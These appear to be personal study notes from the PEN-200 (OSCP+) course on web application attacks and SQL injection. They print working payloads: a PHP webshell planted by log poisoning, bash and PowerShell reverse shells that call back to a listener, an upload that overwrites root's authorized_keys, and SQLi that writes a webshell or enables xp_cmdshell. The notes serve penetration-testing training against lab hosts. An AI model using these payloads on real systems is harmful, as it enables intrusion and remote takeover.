# PEN-200

The certification associate with this course is the **OffSec Certified Professional (OSCP+)**.

{% hint style="success" %}
  Hack Responsibly.

  Always ensure you have explicit permission to access any computer system before using any of the techniques
  contained in these documents. You accept full responsibility for your actions by applying any knowledge gained here.
{% endhint %}

> These will be the notes I felt were worth writing down as things I was not completely familiar with and/or were new to me at the time of working through this course.

-----

## Module 9: Common Web Application Attacks

### Directory Traversal

#### Absolute vs Relative Paths

#### Identifying and Exploiting Directory Traversals

#### Encoding Special Characters

### File Inclusion Vulnerabilities

#### Local File Inclusion (LFI)

The difference here is that including a local file will execute it rather than read the contents of it.
Using Log Poisoning with php and LFI, we can execute commands on the web server.

Taking a look at the previous directory traversal vulnerability, let's see what information is stored in the `/var/log/apache2/access.log`.
In the example provided, the User-Agent is stored. Using this information we can pass along a crafted User-Agent to execute commands via a cmd parameter.
Sending to the `index.php?page=admin.php` a crafted user-agent of `User-Agent: <?php echo system($_GET['cmd']); ?>`
Utilizing this string, we can then navigated to the access.log, appending `&cmd=<our command here>` to execute via LFI.

After testing that the cmd parameter works, let's get a reverse shell. We'll need to URL encode the data so it's treated correctly.
A simple reverse shell one-liner in bash: `bash -c "bash -i >& /dev/tcp/my.listener.ip.here/port 0>&1"` would be URL encoded as `bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.236%2F1337%200%3E%261%22`
Another example might be `bash+-c+'bash+-i+>%26+/dev/tcp/192.168.45.236/1337+0>%261'%22`

#### PHP Wrappers

Include the contents of a file:
- php://filter

Using the PHP filter wrapper in a similar way as previous sections: `curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php`
This results in a similar content as requesting admin.php earlier. Using teh PHP filter to encode the content in base64, we can get the content of admin.php.
`curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php`

Achieve code execution:
- data://
Using the PHP data wrapper to execute commands: `curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"`
Some WAFs may filter strings such as system, so we'll base64 the command.
```
$ echo -n '<?php echo system($_GET["cmd"]);?>' | base64
PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==

$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```

#### Remote File Inclusion (RFI)

Kali includes several webshells are `/usr/share/webshells/` that can be used for RFI.

For RFI, you'll need your remote files to be available somewhere. This can easily be done with `python3 -m http.server 80` which will start a listener on port 80 on all your local interfaces. This hosts any files in your current working directory.
Example: `curl http://mountaindesserts.com/meteor/index.php?page=http://your.listener.ip.here/simple-backdoor.php&cmd=cat+/etc/passwd`

### File Upload Vulnerabilities

#### Using Executable Files

Identifying file upload vulnerabilities:
- Can we upload a file in general?
- Is there file extension limitations? Are they case sensitive? Can we use "legacy" extensions? ex. .phps, .php7

#### Using Non-Executable Files

When using non-executable files, we _may_ be able to overwrite important files like `.ssh/authorized_keys` for example.
Example in Burp Suite's Repeater:
```
POST /upload HTTP/1.1
Host: 192.168.241.16:8000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------39100938162538926675637912586
Content-Length: 386
Origin: http://192.168.241.16:8000
Connection: keep-alive
Referer: http://192.168.241.16:8000/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------39100938162538926675637912586
Content-Disposition: form-data; name="myFile"; filename="../../../../../../../../../../root/.ssh/authorized_keys"
Content-Type: application/octet-stream

ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH7b2Apfpf+ynNDsc702r7dotHjS9RH9gF6AvRP9w5SD user@hostname.local

-----------------------------39100938162538926675637912586--

```

### Command Injection

#### OS Command Injection

While communicating with a Windows device vulnerable to command injection, you can use ``(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell`` to determine if you're running commands inside a CMD or PowerShell prompt. This would likely need to be URL encoded.
If inside PowerShell, PowerCat can be used to create a reverse shell. PowerCat is a PowerShell implementation of Netcat included in Kali at `/usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1`.
- Example usage of powercat.ps1 via command injection: `IEX (New-Object System.Net.Webclient).DownloadString("http://your.listener.ip.here:port/powercat.ps1");powercat -c your.listener.ip.here -p port -e powershell`
    - Curling that with URL encoding may look like this: `curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2Fyour.listener.ip.here%3Aport%2Fpowercat.ps1%22)%3Bpowercat%20-c%20your.listener.ip.here%20-p%20port%20-e%20powershell' http://your.target.ip.here:port/archive`

-----

## Module 10: SQL Injection Attacks

### SQL Theory and Databases

#### SQL Theory Refresher

Structured Query Language (SQL) was developed to manage and interact with data stored inside _relational databases_. It can query, insert, modify, delete data, and in some cases execute operating system commands.

SQL syntax, commands, and functions vary based on which relational database they're made for. _MySQL, Microsoft SQL Server_, and _Oracle_ are the most popular database implementations.

{% hint style="warning" %}
    The "i" inside the _mysqli_query_ stands for improved and should not be confused with the "i" in the SQLi vulnerability which stands for injection.
{% endhint %}

#### DB Types and Characteristics

> __MySQL__
Connecting to the remote SQL instance, specifying **root** as the username and password, along with the default MySQL server port **3306**.
Example: `mysql -u root -p'root' -h 192.168.50.16 -P 3306`
Note: If you're running into issues with self-signed certs, add the `--ssl=0` option. The error I received when working through the material was `ERROR 2026 (HY000): TLS/SSL error: self-signed certificate in certificate chain`

While inside the MySQL console shell, we can run various functions to retrieve additional information.
- Retrieving the version of the SQL instance: `select version();` or `select @@version;`
- Verifying the current database user for the ongoing session: `select system_user();`
- List databases: `show databases;`
- List tables in the mysql database: `show tables from mysql;`
- Selecting everything from the _user_ table in the _mysql_ database: `SELECT * FORM mysql.user;`

To improve security, user passwords are stored in the _authentication_string_ field as a _Caching-SHA-256 algorithm_.

> __MSSQL__
MSSQL is a database managemetn system that natively integrates into the Windows ecosystem.

Windows has a build-in CLI tool named _SQLCMD_, which allows SQL queries to be run through the Windows command prompt or remotely from another machine.
Kali includes _Impacket_, a Python framework which enables network protocol interactions. It supports _Tabular Data Stream (TDS)_, the protocol adopted by MSSQL that is implemented in the _impacket-mssqlclient_ tool.

We can run `impacket-mssqlclient` to connect to the remote Windows machine running MSSQL. Using `-windows-auth` forces NTLM authentication rather than Kerberos.
Example: `impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth`

Once inside the MSSQL console shell, we can run various functions similar to the previously noted MySQL commands.
{% hint style="warning" %}
    When using a SQL Server CLI tool like sqlcmd, we must submit the SQL statement with a semicolon followed by `GO` on a separate line. However, running remote commands allows us to omit the `GO` statement as it's not part of the MSSQL TDS protocol.
{% endhint %}

- Verifying the version: `SELECT @@version;`
- List databases: `SELECT name FROM sys.databases;`  
  _master, tempdb, model_, and _msdb_ are default databases.
- Querying tables in the _offsec_ database: `SELECT * FROM offsec.information_schema.tables;`
- Selecting all records from the _users_ table under the table_schema _dbo_ in the _offsec_ database: `SELECT * FROM offsec.dbo.users;`

### Manual SQL Exploitation

#### Identifying SQLi via Error-based Payloads

In manual testing, we can try closing a quote and adding an `OR 1-1` statement followed by a `--` comment separate and two forward slashes (`//`) to prematurely terminate teh SQL statement. This syntax requires two consecutive dashes followed by at least **one** whitespace character. The example utilizes two slashes to provide visibility on the payload and add some protection against any kind of whitespace truncation employed.
Example: `offsec' OR 1=1 -- //`
The SQL query in this example will then result in the following backend SQL statement: `SELECT * FROM users WHERE user_name= 'offsec' OR 1=1 --`

A quick and simple test for SQLi is to submit a single quote `'` to see how the web application behaves. Note: _Most_ production-level web applications won't show errors because revealing SQL debugging information is considered a security flaw.

If we know a SQLi is available, we can inject an arbitrary second statement as well.
Example: `' or 1=1 in (select @@version) -- //'`

#### UNION-based Payloads

Whenever dealing with in-band SQLi where the result of the query is displayed along with the applciation-returend value, we should also test for _UNION-based_ SQL injections.

The **UNION** statements assists exploitation because it enables the execution of another SELECT statement, providing the results in the same query.

For a **UNION** SQLi to work, it has two requirements:
1. The injection **UNION** query has to include the same number of columns as the original query.
2. The data types must be compatible between each column.

To determine how many columns, we can submit the command `' ORDER BY 1-- //'`, incrementing the order until we receive an error which lets us know that numbered column does not exist.
As an example, if the table has 5 columns, we can execute: `%' UNION SELECT database(), user(), @@version, null, null -- //`
This resulted, in the material with displaying the result of user and version, but not database. Likely because the first column is typically reserved for the ID field consisting of _integer_ data type values, meaning a string cannot be returned for database().
With this in mind, let's re-order the request, ensuring the queries we know will return string, are "lined up" with the original select statement's columns.
Example: `'UNION SELECT null, null, database(), user(), @@version -- //`

To expand on this, let's grab the columns table from the _information_schema_ database belonging to the current database, storing the output in the second, third, and fourth columns.
Example: `' UNION SELECT null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //`


#### Blind SQL Injections

A _blind_ SQLi describes scenarios where database responses are never returned and behavior is inferred using boolean- or time-based logic.
Example time-based SQLi: `http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3), 'false') -- //`
In the above case, if the user _offsec_ does exist then the browser will hang for about three seconds, if not then it will immediately return.

### Manual and Automated Code Execution

#### Manual Code Execution

In Microsoft SQL Server, the _xp_cmdshell_ function takes a string and passes it to a command shell for execution. This function is disabled by default, and once enabled, must be called with the **EXECUTE** keyword rather than SELECT.
To enable it, execute the following commands in a MSSQL shell:
```
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```
It can now be used like so: `EXECUTE xp_cmdshell 'whoami';`

Using a UNION-based payload, we can write a webshell into a file on disk.
Example: `' UNION SELECT  "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //`
Running into the error regarding the value type not matching (column 1 being an integer for example) isn't an issue that affect writing to disk. The above code _should_ still write the webshell to the location written.

#### Automating the Attack

There are several tools to automate SQLi. One very popular tool is **sqlmap**.
Example usage of sqlmap: `sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user`
`-u <url>,              specify the URL to scan`
`-p <parameter name>,   specify the parameter to test`
`--dump,                dump the entire database`
`--os-shell,            provide a full interactive shell`

Because Blind SQLi can take so long, it can be useful to download the post/get request from burpsuite then providing it to sqlmap to automate this rather then doing it yourself.

-----
